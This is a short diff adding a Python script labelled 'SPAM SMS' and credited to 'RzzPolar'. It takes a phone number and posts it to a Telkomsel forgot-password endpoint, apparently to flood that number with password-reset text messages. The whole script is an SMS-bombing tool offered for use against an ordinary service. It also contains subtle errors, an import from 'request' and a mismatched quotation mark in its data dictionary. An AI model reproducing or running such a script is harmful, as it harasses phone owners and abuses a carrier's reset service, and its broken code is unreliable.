@@ -1,0 +1,7 @@
+# SPAM SMS
+from request import post
+print ("coder by RzzPolar")
+i = input("MASUKAN NO :")
+dat = {"msisdn' : i}
+re = post("https://roli.telkomsel.com/auth/forgot_password",dat)
+print ("STATUS:",re.json()["message"])
